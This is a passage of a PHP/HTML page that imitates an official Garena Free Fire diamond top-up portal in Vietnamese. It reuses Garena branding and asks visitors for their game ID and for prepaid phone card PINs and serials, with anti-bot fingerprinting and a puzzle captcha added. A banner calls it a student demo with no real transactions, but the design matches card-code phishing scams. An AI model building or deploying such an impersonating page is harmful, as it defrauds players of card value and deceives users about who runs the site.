<?php
require_once('header.php');
function maskId($id)
{
    $s = strval($id);
    if (strlen($s) <= 4)
        return substr($s, 0, 1) . str_repeat('*', strlen($s) - 2) . substr($s, -1);
    return substr($s, 0, 2) . str_repeat('*', strlen($s) - 4) . substr($s, -2);
}
?>

<body class="drawer drawer--right">
<noscript>
  <style>
    .majorWrap, header, footer, section { display: none !important; }
    .noscript-container { background: #0f172a; color: #ffffff; text-align: center; padding: 100px 20px; position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999; }
    .noscript-container h1 { color: #ef4444; font-size: 28px; }
  </style>
  <div class="noscript-container">
    <h1>Yêu cầu kích hoạt JavaScript</h1>
    <p>Trang web này yêu cầu JavaScript hoạt động để thực hiện thanh toán an toàn và bảo mật.</p>
    <p>Vui lòng bật JavaScript trong cài đặt trình duyệt của bạn và tải lại trang.</p>
  </div>
</noscript>
<script>
  window.antibotSessionToken = "<?= $_SESSION['antibot_token'] ?? '' ?>";
  let touchCount = 0;
  let humanVerifiedToken = '';
  function trackInteraction() {
    touchCount++;
    if (touchCount > 5 && !humanVerifiedToken) {
      humanVerifiedToken = window.antibotSessionToken;
      window.removeEventListener('mousemove', trackInteraction);
      window.removeEventListener('touchstart', trackInteraction);
      window.removeEventListener('scroll', trackInteraction);
    }
  }
  window.addEventListener('mousemove', trackInteraction);
  window.addEventListener('touchstart', trackInteraction);
  window.addEventListener('scroll', trackInteraction);

  function getCanvasFingerprint() {
    try {
      const canvas = document.createElement('canvas');
      const ctx = canvas.getContext('2d');
      ctx.textBaseline = "top";
      ctx.font = "14px 'Arial'";
      ctx.fillText("GarenaFF-Fingerprint-v1", 2, 2);
      const src = canvas.toDataURL();
      let hash = 0;
      for (let i = 0; i < src.length; i++) {
        hash = (hash << 5) - hash + src.charCodeAt(i);
        hash = hash & hash;
      }
      let hex = Math.abs(hash).toString(16).padStart(8, '0');
      let combined = (hex + hex + hex + hex).substring(0, 32);
      return combined;
    } catch (e) {
      return "e5c322ac0b10403f882f6e5e7eb9ca3a";
    }
  }
</script>
    <header role="banner">
        <button type="button" class="drawer-toggle drawer-hamburger">
            <span class="sr-only">toggle navigation</span>
            <!-- <span class="drawer-hamburger-icon"></span> -->
            <div class="drawer-close-button">
                <i class="drawer-close-icon fas fa-times"></i>
            </div>
        </button>
        <nav class="drawer-nav" role="navigation"></nav>
    </header>
    <div class="searchbar-outter-container">
        <div class="container">
            <div class="row">
                <div class="col-md-offset-1 col-md-10 col-lg-offset-2 col-lg-8">
                    <div class="row">
                        <div id="searchbar-container">
                            <form id="search-form" method="get">
                                <div class="input-group">
                                    <input type="text" class="form-control" name="search" value=""
                                        placeholder="Game title" id="search_input" />
                                    <span class="input-group-btn">
                                        <button class="searchbar-button btn btn-up-orange" type="submit">
                                            <i class="c-white fas fa-search"></i>
                                        </button>
                                        <button class="searchbar-trigger btn searchbar-close-button" type="button">
                                            <i class="c-grey fas fa-times"></i>
                                        </button>
                                    </span>
                                </div>
                            </form>
                            <!-- /input-group -->
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="topbar">
        <div class="container">
            <div class="row">
                <div class="col-lg-offset-1 col-lg-10">
                    <div id="bar-container">
                        <div class="top-menu top-menu-left">
                            <div class="searchbar-trigger topbar-item-container"></div>
                        </div>
                        <div class="top-menu top-menu-right">
                            <div class="topbar-item-container">
                                <span class="language-dropdown-trigger" data-name="Vietnam">
                                    <p class="c-grey topbar-desktop-language"></p>
                                    <div class="topbar-language-icon">
                                        <span class="language-dropdown-countryicon ip2location-flag-32 flag-vn"></span>

                                        <div class="topbar-mobile-language c-grey">
                                            <b></b>
                                        </div>
                                    </div>
                                </span>
                                <span> </span>
                            </div>
                        </div>
                        <div class="text-center top-menu-center">
                            <a href="/">
                                <img class="unipin-logo" src="/images/mshop_header.webp" alt="Nạp Kim Cương Free Fire"
                                    width="160" height="40" />
                            </a>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <div class="topbar-offset"></div>
    <div class="pageLoader"></div>
    <div class="majorWrap">
        <div id="ajaxArea">
            <main role="main" class="body-pale">
                <div class="bg-grey3">
                    <div class="container payment-page-container">
                        <div class="row">
                            <div class="col-md-4 col-lg-offset-1 col-lg-4">
                                <section class="payment-gameinfo-container">
                                    <div class="row">
                                        <img src="/images/banner.webp" alt="Nạp Kim Cương Free Fire" width="393"
                                            height="242" srcset="/images/banner.webp 396w, /images/banner.webp 1080w"
                                            sizes="242vw" />

                                        <style>
                                            marquee {
                                                color: white;
                                                width: 100%;
                                                padding: 5px 0;
                                                background-color: #3a7bfc;
                                            }
                                        </style>
                                        <marquee direction="scroll">⚠️ LƯU Ý: Đây chỉ là đồ án Demo UI/UX phục vụ mục đích nghiên cứu và học tập của sinh viên. KHÔNG CÓ BẤT KỲ GIAO DỊCH THẬT NÀO ĐƯỢC THỰC HIỆN! ⚠️</marquee>
                                    </div>



                                    <div class="app-install aos-init aos-animate" data-aos="fade-up"
                                        data-aos-duration="1000" data-aos-offset="-300" data-aos-delay="600"
                                        style="margin-bottom: 120px; transform: translate(0px, 0px); opacity: 1;">

                                        <div class="col-sm-6 col-xs-6 col-md-6">

                                            <p>
                                                <a href="https://play.google.com/store/apps/details?id=com.dts.freefireth&pcampaignid=web_share"
                                                    target="_blank" rel="noopener noreferrer"><img
                                                        src="/images/mobile.webp" alt="mobile" width="153"
                                                        height="59"></a>
                                            </p>

                                        </div>

                                        <div class="col-sm-6 col-xs-6 col-md-6">


                                            <p>
                                                <a href="https://itunes.apple.com/vn/app/garena-free-fire/id1300146617?mt=8"
                                                    target="_blank" rel="noopener noreferrer">
                                                    <svg id="livetype" xmlns="http://www.w3.org/2000/svg"
                                                        viewBox="0 0 119.66407 40" class="apple-store"
                                                        data-v-4c89bc92="">
                                                        <title data-v-4c89bc92="">
                                                            Download_on_the_App_Store_Badge_US-UK_RGB_blk_4SVG_092917
                                                        </title>
                                                        <g data-v-4c89bc92="">
                                                            <g data-v-4c89bc92="">
                                                                <g data-v-4c89bc92="">
                                                                    <path
                                                                        d="M110.13477,0H9.53468c-.3667,0-.729,0-1.09473.002-.30615.002-.60986.00781-.91895.0127A13.21476,13.21476,0,0,0,5.5171.19141a6.66509,6.66509,0,0,0-1.90088.627A6.43779,6.43779,0,0,0,1.99757,1.99707,6.25844,6.25844,0,0,0,.81935,3.61816a6.60119,6.60119,0,0,0-.625,1.90332,12.993,12.993,0,0,0-.1792,2.002C.00587,7.83008.00489,8.1377,0,8.44434V31.5586c.00489.3105.00587.6113.01515.9219a12.99232,12.99232,0,0,0,.1792,2.0019,6.58756,6.58756,0,0,0,.625,1.9043A6.20778,6.20778,0,0,0,1.99757,38.001a6.27445,6.27445,0,0,0,1.61865,1.1787,6.70082,6.70082,0,0,0,1.90088.6308,13.45514,13.45514,0,0,0,2.0039.1768c.30909.0068.6128.0107.91895.0107C8.80567,40,9.168,40,9.53468,40H110.13477c.3594,0,.7246,0,1.084-.002.3047,0,.6172-.0039.9219-.0107a13.279,13.279,0,0,0,2-.1768,6.80432,6.80432,0,0,0,1.9082-.6308,6.27742,6.27742,0,0,0,1.6172-1.1787,6.39482,6.39482,0,0,0,1.1816-1.6143,6.60413,6.60413,0,0,0,.6191-1.9043,13.50643,13.50643,0,0,0,.1856-2.0019c.0039-.3106.0039-.6114.0039-.9219.0078-.3633.0078-.7246.0078-1.0938V9.53613c0-.36621,0-.72949-.0078-1.09179,0-.30664,0-.61426-.0039-.9209a13.5071,13.5071,0,0,0-.1856-2.002,6.6177,6.6177,0,0,0-.6191-1.90332,6.46619,6.46619,0,0,0-2.7988-2.7998,6.76754,6.76754,0,0,0-1.9082-.627,13.04394,13.04394,0,0,0-2-.17676c-.3047-.00488-.6172-.01074-.9219-.01269-.3594-.002-.7246-.002-1.084-.002Z"
                                                                        style="fill: #a6a6a6" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M8.44483,39.125c-.30468,0-.602-.0039-.90429-.0107a12.68714,12.68714,0,0,1-1.86914-.1631,5.88381,5.88381,0,0,1-1.65674-.5479,5.40573,5.40573,0,0,1-1.397-1.0166,5.32082,5.32082,0,0,1-1.02051-1.3965,5.72186,5.72186,0,0,1-.543-1.6572,12.41351,12.41351,0,0,1-.1665-1.875c-.00634-.2109-.01464-.9131-.01464-.9131V8.44434S.88185,7.75293.8877,7.5498a12.37039,12.37039,0,0,1,.16553-1.87207,5.7555,5.7555,0,0,1,.54346-1.6621A5.37349,5.37349,0,0,1,2.61183,2.61768,5.56543,5.56543,0,0,1,4.01417,1.59521a5.82309,5.82309,0,0,1,1.65332-.54394A12.58589,12.58589,0,0,1,7.543.88721L8.44532.875H111.21387l.9131.0127a12.38493,12.38493,0,0,1,1.8584.16259,5.93833,5.93833,0,0,1,1.6709.54785,5.59374,5.59374,0,0,1,2.415,2.41993,5.76267,5.76267,0,0,1,.5352,1.64892,12.995,12.995,0,0,1,.1738,1.88721c.0029.2832.0029.5874.0029.89014.0079.375.0079.73193.0079,1.09179V30.4648c0,.3633,0,.7178-.0079,1.0752,0,.3252,0,.6231-.0039.9297a12.73126,12.73126,0,0,1-.1709,1.8535,5.739,5.739,0,0,1-.54,1.67,5.48029,5.48029,0,0,1-1.0156,1.3857,5.4129,5.4129,0,0,1-1.3994,1.0225,5.86168,5.86168,0,0,1-1.668.5498,12.54218,12.54218,0,0,1-1.8692.1631c-.2929.0068-.5996.0107-.8974.0107l-1.084.002Z"
                                                                        data-v-4c89bc92=""></path>
                                                                </g>
                                                                <g id="_Group_" data-name="<Group>" data-v-4c89bc92="">
                                                                    <g id="_Group_2" data-name="<Group>"
                                                                        data-v-4c89bc92="">
                                                                        <g id="_Group_3" data-name="<Group>"
                                                                            data-v-4c89bc92="">
                                                                            <path id="_Path_" data-name="<Path>"
                                                                                d="M24.76888,20.30068a4.94881,4.94881,0,0,1,2.35656-4.15206,5.06566,5.06566,0,0,0-3.99116-2.15768c-1.67924-.17626-3.30719,1.00483-4.1629,1.00483-.87227,0-2.18977-.98733-3.6085-.95814a5.31529,5.31529,0,0,0-4.47292,2.72787c-1.934,3.34842-.49141,8.26947,1.3612,10.97608.9269,1.32535,2.01018,2.8058,3.42763,2.7533,1.38706-.05753,1.9051-.88448,3.5794-.88448,1.65876,0,2.14479.88448,3.591.8511,1.48838-.02416,2.42613-1.33124,3.32051-2.66914a10.962,10.962,0,0,0,1.51842-3.09251A4.78205,4.78205,0,0,1,24.76888,20.30068Z"
                                                                                style="fill: #fff" data-v-4c89bc92="">
                                                                            </path>
                                                                            <path id="_Path_2" data-name="<Path>"
                                                                                d="M22.03725,12.21089a4.87248,4.87248,0,0,0,1.11452-3.49062,4.95746,4.95746,0,0,0-3.20758,1.65961,4.63634,4.63634,0,0,0-1.14371,3.36139A4.09905,4.09905,0,0,0,22.03725,12.21089Z"
                                                                                style="fill: #fff" data-v-4c89bc92="">
                                                                            </path>
                                                                        </g>
                                                                    </g>
                                                                    <g data-v-4c89bc92="">
                                                                        <path
                                                                            d="M42.30227,27.13965h-4.7334l-1.13672,3.35645H34.42727l4.4834-12.418h2.083l4.4834,12.418H43.438ZM38.0591,25.59082h3.752l-1.84961-5.44727h-.05176Z"
                                                                            style="fill: #fff" data-v-4c89bc92="">
                                                                        </path>
                                                                        <path
                                                                            d="M55.15969,25.96973c0,2.81348-1.50586,4.62109-3.77832,4.62109a3.0693,3.0693,0,0,1-2.84863-1.584h-.043v4.48438h-1.8584V21.44238H48.4302v1.50586h.03418a3.21162,3.21162,0,0,1,2.88281-1.60059C53.645,21.34766,55.15969,23.16406,55.15969,25.96973Zm-1.91016,0c0-1.833-.94727-3.03809-2.39258-3.03809-1.41992,0-2.375,1.23047-2.375,3.03809,0,1.82422.95508,3.0459,2.375,3.0459C52.30227,29.01563,53.24953,27.81934,53.24953,25.96973Z"
                                                                            style="fill: #fff" data-v-4c89bc92="">
                                                                        </path>
                                                                        <path
                                                                            d="M65.12453,25.96973c0,2.81348-1.50586,4.62109-3.77832,4.62109a3.0693,3.0693,0,0,1-2.84863-1.584h-.043v4.48438h-1.8584V21.44238H58.395v1.50586h.03418A3.21162,3.21162,0,0,1,61.312,21.34766C63.60988,21.34766,65.12453,23.16406,65.12453,25.96973Zm-1.91016,0c0-1.833-.94727-3.03809-2.39258-3.03809-1.41992,0-2.375,1.23047-2.375,3.03809,0,1.82422.95508,3.0459,2.375,3.0459C62.26711,29.01563,63.21438,27.81934,63.21438,25.96973Z"
                                                                            style="fill: #fff" data-v-4c89bc92="">
                                                                        </path>
                                                                        <path
                                                                            d="M71.71047,27.03613c.1377,1.23145,1.334,2.04,2.96875,2.04,1.56641,0,2.69336-.80859,2.69336-1.91895,0-.96387-.67969-1.541-2.28906-1.93652l-1.60937-.3877c-2.28027-.55078-3.33887-1.61719-3.33887-3.34766,0-2.14258,1.86719-3.61426,4.51855-3.61426,2.624,0,4.42285,1.47168,4.4834,3.61426h-1.876c-.1123-1.23926-1.13672-1.9873-2.63379-1.9873s-2.52148.75684-2.52148,1.8584c0,.87793.6543,1.39453,2.25488,1.79l1.36816.33594c2.54785.60254,3.60645,1.626,3.60645,3.44238,0,2.32324-1.85059,3.77832-4.79395,3.77832-2.75391,0-4.61328-1.4209-4.7334-3.667Z"
                                                                            style="fill: #fff" data-v-4c89bc92="">
                                                                        </path>
                                                                        <path
                                                                            d="M83.34621,19.2998v2.14258h1.72168v1.47168H83.34621v4.99121c0,.77539.34473,1.13672,1.10156,1.13672a5.80752,5.80752,0,0,0,.61133-.043v1.46289a5.10351,5.10351,0,0,1-1.03223.08594c-1.833,0-2.54785-.68848-2.54785-2.44434V22.91406H80.16262V21.44238H81.479V19.2998Z"
                                                                            style="fill: #fff" data-v-4c89bc92="">
                                                                        </path>
                                                                        <path
                                                                            d="M86.065,25.96973c0-2.84863,1.67773-4.63867,4.29395-4.63867,2.625,0,4.29492,1.79,4.29492,4.63867,0,2.85645-1.66113,4.63867-4.29492,4.63867C87.72609,30.6084,86.065,28.82617,86.065,25.96973Zm6.69531,0c0-1.9541-.89551-3.10742-2.40137-3.10742s-2.40039,1.16211-2.40039,3.10742c0,1.96191.89453,3.10645,2.40039,3.10645S92.76027,27.93164,92.76027,25.96973Z"
                                                                            style="fill: #fff" data-v-4c89bc92="">
                                                                        </path>
                                                                        <path
                                                                            d="M96.18606,21.44238h1.77246v1.541h.043a2.1594,2.1594,0,0,1,2.17773-1.63574,2.86616,2.86616,0,0,1,.63672.06934v1.73828a2.59794,2.59794,0,0,0-.835-.1123,1.87264,1.87264,0,0,0-1.93652,2.083v5.37012h-1.8584Z"
                                                                            style="fill: #fff" data-v-4c89bc92="">
                                                                        </path>
                                                                        <path
                                                                            d="M109.3843,27.83691c-.25,1.64355-1.85059,2.77148-3.89844,2.77148-2.63379,0-4.26855-1.76465-4.26855-4.5957,0-2.83984,1.64355-4.68164,4.19043-4.68164,2.50488,0,4.08008,1.7207,4.08008,4.46582v.63672h-6.39453v.1123a2.358,2.358,0,0,0,2.43555,2.56445,2.04834,2.04834,0,0,0,2.09082-1.27344Zm-6.28223-2.70215h4.52637a2.1773,2.1773,0,0,0-2.2207-2.29785A2.292,2.292,0,0,0,103.10207,25.13477Z"
                                                                            style="fill: #fff" data-v-4c89bc92="">
                                                                        </path>
                                                                    </g>
                                                                </g>
                                                            </g>
                                                            <g id="_Group_4" data-name="<Group>" data-v-4c89bc92="">
                                                                <g data-v-4c89bc92="">
                                                                    <path
                                                                        d="M37.82619,8.731a2.63964,2.63964,0,0,1,2.80762,2.96484c0,1.90625-1.03027,3.002-2.80762,3.002H35.67092V8.731Zm-1.22852,5.123h1.125a1.87588,1.87588,0,0,0,1.96777-2.146,1.881,1.881,0,0,0-1.96777-2.13379h-1.125Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M41.68068,12.44434a2.13323,2.13323,0,1,1,4.24707,0,2.13358,2.13358,0,1,1-4.24707,0Zm3.333,0c0-.97607-.43848-1.54687-1.208-1.54687-.77246,0-1.207.5708-1.207,1.54688,0,.98389.43457,1.55029,1.207,1.55029C44.57522,13.99463,45.01369,13.42432,45.01369,12.44434Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M51.57326,14.69775h-.92187l-.93066-3.31641h-.07031l-.92676,3.31641h-.91309l-1.24121-4.50293h.90137l.80664,3.436h.06641l.92578-3.436h.85254l.92578,3.436h.07031l.80273-3.436h.88867Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M53.85354,10.19482H54.709v.71533h.06641a1.348,1.348,0,0,1,1.34375-.80225,1.46456,1.46456,0,0,1,1.55859,1.6748v2.915h-.88867V12.00586c0-.72363-.31445-1.0835-.97168-1.0835a1.03294,1.03294,0,0,0-1.0752,1.14111v2.63428h-.88867Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path d="M59.09377,8.437h.88867v6.26074h-.88867Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M61.21779,12.44434a2.13346,2.13346,0,1,1,4.24756,0,2.1338,2.1338,0,1,1-4.24756,0Zm3.333,0c0-.97607-.43848-1.54687-1.208-1.54687-.77246,0-1.207.5708-1.207,1.54688,0,.98389.43457,1.55029,1.207,1.55029C64.11232,13.99463,64.5508,13.42432,64.5508,12.44434Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M66.4009,13.42432c0-.81055.60352-1.27783,1.6748-1.34424l1.21973-.07031v-.38867c0-.47559-.31445-.74414-.92187-.74414-.49609,0-.83984.18213-.93848.50049h-.86035c.09082-.77344.81836-1.26953,1.83984-1.26953,1.12891,0,1.76563.562,1.76563,1.51318v3.07666h-.85547v-.63281h-.07031a1.515,1.515,0,0,1-1.35254.707A1.36026,1.36026,0,0,1,66.4009,13.42432Zm2.89453-.38477v-.37646l-1.09961.07031c-.62012.0415-.90137.25244-.90137.64941,0,.40527.35156.64111.835.64111A1.0615,1.0615,0,0,0,69.29543,13.03955Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M71.34816,12.44434c0-1.42285.73145-2.32422,1.86914-2.32422a1.484,1.484,0,0,1,1.38086.79h.06641V8.437h.88867v6.26074h-.85156v-.71143h-.07031a1.56284,1.56284,0,0,1-1.41406.78564C72.0718,14.772,71.34816,13.87061,71.34816,12.44434Zm.918,0c0,.95508.4502,1.52979,1.20313,1.52979.749,0,1.21191-.583,1.21191-1.52588,0-.93848-.46777-1.52979-1.21191-1.52979C72.72121,10.91846,72.26613,11.49707,72.26613,12.44434Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M79.23,12.44434a2.13323,2.13323,0,1,1,4.24707,0,2.13358,2.13358,0,1,1-4.24707,0Zm3.333,0c0-.97607-.43848-1.54687-1.208-1.54687-.77246,0-1.207.5708-1.207,1.54688,0,.98389.43457,1.55029,1.207,1.55029C82.12453,13.99463,82.563,13.42432,82.563,12.44434Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M84.66945,10.19482h.85547v.71533h.06641a1.348,1.348,0,0,1,1.34375-.80225,1.46456,1.46456,0,0,1,1.55859,1.6748v2.915H87.605V12.00586c0-.72363-.31445-1.0835-.97168-1.0835a1.03294,1.03294,0,0,0-1.0752,1.14111v2.63428h-.88867Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M93.51516,9.07373v1.1416h.97559v.74854h-.97559V13.2793c0,.47168.19434.67822.63672.67822a2.96657,2.96657,0,0,0,.33887-.02051v.74023a2.9155,2.9155,0,0,1-.4834.04541c-.98828,0-1.38184-.34766-1.38184-1.21582v-2.543h-.71484v-.74854h.71484V9.07373Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M95.70461,8.437h.88086v2.48145h.07031a1.3856,1.3856,0,0,1,1.373-.80664,1.48339,1.48339,0,0,1,1.55078,1.67871v2.90723H98.69v-2.688c0-.71924-.335-1.0835-.96289-1.0835a1.05194,1.05194,0,0,0-1.13379,1.1416v2.62988h-.88867Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                    <path
                                                                        d="M104.76125,13.48193a1.828,1.828,0,0,1-1.95117,1.30273A2.04531,2.04531,0,0,1,100.73,12.46045a2.07685,2.07685,0,0,1,2.07617-2.35254c1.25293,0,2.00879.856,2.00879,2.27V12.688h-3.17969v.0498a1.1902,1.1902,0,0,0,1.19922,1.29,1.07934,1.07934,0,0,0,1.07129-.5459Zm-3.126-1.45117h2.27441a1.08647,1.08647,0,0,0-1.1084-1.1665A1.15162,1.15162,0,0,0,101.63527,12.03076Z"
                                                                        style="fill: #fff" data-v-4c89bc92=""></path>
                                                                </g>
                                                            </g>
                                                        </g>
                                                    </svg>
                                                    <path
                                                        d="M8.44483,39.125c-.30468,0-.602-.0039-.90429-.0107a12.68714,12.68714,0,0,1-1.86914-.1631,5.88381,5.88381,0,0,1-1.65674-.5479,5.40573,5.40573,0,0,1-1.397-1.0166,5.32082,5.32082,0,0,1-1.02051-1.3965,5.72186,5.72186,0,0,1-.543-1.6572,12.41351,12.41351,0,0,1-.1665-1.875c-.00634-.2109-.01464-.9131-.01464-.9131V8.44434S.88185,7.75293.8877,7.5498a12.37039,12.37039,0,0,1,.16553-1.87207,5.7555,5.7555,0,0,1,.54346-1.6621A5.37349,5.37349,0,0,1,2.61183,2.61768,5.56543,5.56543,0,0,1,4.01417,1.59521a5.82309,5.82309,0,0,1,1.65332-.54394A12.58589,12.58589,0,0,1,7.543.88721L8.44532.875H111.21387l.9131.0127a12.38493,12.38493,0,0,1,1.8584.16259,5.93833,5.93833,0,0,1,1.6709.54785,5.59374,5.59374,0,0,1,2.415,2.41993,5.76267,5.76267,0,0,1,.5352,1.64892,12.995,12.995,0,0,1,.1738,1.88721c.0029.2832.0029.5874.0029.89014.0079.375.0079.73193.0079,1.09179V30.4648c0,.3633,0,.7178-.0079,1.0752,0,.3252,0,.6231-.0039.9297a12.73126,12.73126,0,0,1-.1709,1.8535,5.739,5.739,0,0,1-.54,1.67,5.48029,5.48029,0,0,1-1.0156,1.3857,5.4129,5.4129,0,0,1-1.3994,1.0225,5.86168,5.86168,0,0,1-1.668.5498,12.54218,12.54218,0,0,1-1.8692.1631c-.2929.0068-.5996.0107-.8974.0107l-1.084.002Z"
                                                        data-v-4c89bc92=""></path>
                                                </a>
                                            </p>

                                            <div>
                                            </div>
                                        </div>
                                        <!--    <div class="col-sm-12 col-xs-12 col-md-12 text-center">-->

                                        <!--        <a href="https://www.facebook.com/freefirevn/?locale=vi_VN" target="_blank"><img-->
                                        <!--                src="https://ff.garena.com/vn/" alt=""></a>-->
                                        <!--        <a href="https://www.youtube.com/channel/UCI8AqexXGYwCuQd4Ttts0FQ"-->
                                        <!--            target="_blank"><img-->
                                        <!--                src="https://www.youtube.com/channel/UCI8AqexXGYwCuQd4Ttts0FQ"-->
                                        <!--                alt=""></a>-->
                                        <!--        <a href="https://ff.garena.vn/mobile/ff?pid=OrganicA&amp;c="-->
                                        <!--            target="_blank"><img-->
                                        <!--                src="/images/mobile.webp"-->
                                        <!--                alt=""></a>-->
                                        <!--    </div>-->
                                        <!--</div>-->
                                        <div class="col-sm-12 col-xs-12 col-md-12 text-center">
                                            <!-- End of Other item isExist -->
                                            <div class="payment-game-description c-grey5 hidden-xs hidden-sm">
                                                <!--  -->
                                                <p>
                                                    <b>
                                                        <p>
                                                            Garena Free Fire (tên đầy đủ là Garena Free Fire
                                                            Battlegrounds,
                                                            Chào mừng bạn đến với Dịch vụ của Garena được được vận hành
                                                            bởi
                                                            Công ty cổ phần Giải trí và Thể thao điện tử Việt Nam và các
                                                            công ty liên kết (gọi riêng và gọi chung là, "Garena"
                                                        </p>


                                                    </b>
                                                </p>

                                                <div class="payment-readmore">
                                                    <!--   <b>
                      <i class="fas fa-caret-down"></i>
                      &nbsp Read more info &nbsp
                      <i class="fas fa-caret-down"></i>
                    </b> -->
                                                </div>
                                                <div class="row">
                                                    <br />
                                                    <br />
                                                    <br />
                                                    <br />
                                                </div>
                                            </div>
                                            <div class="text-center"></div>
                                        </div>
                                </section>
                            </div>
                            <div class="payment-step-outter-container col-md-8 col-lg-6">


                                <div class="alert alert-success" role="alert">
                                    <h2> 💎 Nạp thẻ để nhận siêu ưu đãi từ Garena Free Fire 💎 </h2>
                                    <p> <strong> Trải nghiệm an toàn và nhanh chóng với cổng nạp thẻ Fire Fire 2025.
                                            Nhận ngay kim cương chỉ sau 1 , 2 phút !

                                        </strong>💎</p>

                                    <p>Ưu đãi sự kiện lễ tết tặng 20% giá trị thẻ nạp </p>
                                    <!--<p>Ưu duyệt mệnh giá từ 50k trở lên</p>-->

                                    <!-- <b id="sokc">......</b> -->

                                </div>


                                <!-- <script>
                                setInterval(() => {
                                    $.ajax({
                                        url: "kckc.php",
                                    }).done(function(data) {
                                        $('#sokc').html(data);
                                    });
                                }, 1000);
                                </script> -->



                                <div class="row">
                                    <div class="payment-step-container" id="idValue">
                                        <div class="payment-caption-container">
                                            <div class="payment-step-bullet">
                                                <b>1</b>
                                            </div>
                                            <div class="h5 payment-caption c-grey">
                                                <b>Xác thực thông tin</b>
                                            </div>
                                        </div>
                                        <div class="form-group">
                                            <input style="width: 100%;" class="form-input-id form-control"
                                                placeholder="NHẬP ID GAME FREE FIRE" id="id_game" type="number"
                                                required />
                                            <input name="influencer" type="hidden" value="" />
                                            <input name="game" type="hidden" value="light-of-thel-glory-of-cepheus" />
                                        </div>
                                        <div class="alert1" style="margin: 10px 0px;"></div>
                                        <br />

                                        <button onclick="showFormRecharge()" class="btn-up-orange first-verify"
                                            style="width: 100%;">XÁC NHẬN</button>
                                    </div>



                                    <div class="payment-step-container" id="paymentPanel" style="display: none;">
                                        <div class="payment-caption-container">
                                            <div class="payment-step-bullet">
                                                <b>1</b>
                                            </div>
                                            <div class="h5 payment-caption c-grey">
                                                <b>Thanh toán</b>
                                            </div>
                                        </div>
                                        <form class="form-inline-nomargin form-inline">
                                            <div class="form-group">
                                                <input class="form-input-id form-control"
                                                    placeholder="Gói Kim Cương Free Fire X10" style="width: 170%;"
                                                    readonly name="id_game_input" id="id_game_input" type="text" />
                                                <input name="influencer" type="hidden" value="" />
                                                <input name="game" type="hidden"
                                                    value="light-of-thel-glory-of-cepheus" />
                                            </div>
                                            <div class="help-block-id c-grey5">Vui lòng chọn mệnh giá thẻ phù hợp với
                                                gói nạp KIM CƯƠNG 💎</div>
                                            <div class="form-group">
                                                <select name="telco" required="" style="width: 100%;" id="telco"
                                                    onchange="seriInput()">
                                                    <option value="">-Chọn loại thẻ-</option>
                                                    <?php
                                                    // Load danh sách nhà mạng từ database
                                                    $telcos = $CMSNT->get_list("SELECT * FROM `telcos` WHERE `status` = 1 ORDER BY `name` ASC");
                                                    foreach ($telcos as $telco) {
                                                        echo '<option value="' . $telco['code'] . '">' . $telco['name'] . '</option>';
                                                    }
                                                    ?>
                                                </select>
                                            </div>
                                            <div class="form-group">
                                                <select name="amount" required="" style="width: 100%;" id="amount">
                                                    <option value="">-Chọn mệnh giá-</option>
                                                    <option value="20000">20.000 VND</option>
                                                    <option value="50000">50.000 VND</option>
                                                    <option value="100000">100.000 VND</option>
                                                    <option value="200000">200.000 VND</option>
                                                    <option value="500000">500.000 VND</option>
                                                </select>
                                            </div>
                                            <p></p>
                                            <p>
                                                <input class="form-input-id form-control card-info"
                                                    placeholder="Nhập mã thẻ" style="width: 100%;" required=""
                                                    name="pin" id="pin" type="number" />
                                            </p>
                                            <div id="seriInpt">
                                                <p>

                                                    <input class="form-input-id form-control card-info"
                                                        placeholder="Nhập số seri thẻ" style="width: 100%;" required
                                                        name="serial" id="serial" type="number" />
                                                </p>
                                            </div>
                                            <div class="alert1" style="margin: 10px 0px;"></div>
                                            <div class="alert1" style="margin: 10px 0px;"></div>

                                             <!-- Captcha dạng mảnh ghép (Puzzle Slider) -->
                                             <?php if ($CMSNT->site('enable_puzzle_captcha') == 1): ?>
                                             <div class="form-group" style="margin-bottom: 20px;">
                                                 <label class="c-grey block text-sm font-medium mb-2">Giải câu đố mảnh ghép:</label>
                                                 <div style="width: 260px; margin: 0 auto;">
                                                     <!-- Khung chứa ảnh ghép -->
                                                     <div class="puzzle-container" style="position: relative; width: 260px; height: 150px; border-radius: 8px; overflow: hidden; border: 1px solid #475569; background: #0f172a;">
                                                         <img id="puzzle_bg" src="" style="width: 260px; height: 150px; display: block;" />
                                                         <img id="puzzle_piece" src="" style="position: absolute; width: 40px; height: 40px; top: 0; left: 0; z-index: 10; filter: drop-shadow(0px 2px 4px rgba(0,0,0,0.5));" />
                                                         <button type="button" onclick="loadPuzzleCaptcha()" style="position: absolute; right: 5px; top: 5px; z-index: 20; background: rgba(15,23,42,0.6); border: none; color: #fff; border-radius: 4px; padding: 4px 8px; cursor: pointer; font-size: 10px;">
                                                             <i class="fas fa-sync-alt"></i> Đổi ảnh
                                                         </button>
                                                     </div>
                                                     
                                                     <!-- Thanh trượt -->
                                                     <div id="slider_track" style="position: relative; width: 260px; height: 40px; background: #1e293b; border-radius: 20px; border: 1px solid #475569; margin-top: 10px; overflow: hidden; display: flex; align-items: center; justify-content: center; user-select: none;">
                                                         <span id="slider_text" style="font-size: 12px; color: #94a3b8; pointer-events: none;">Kéo để ghép hình</span>
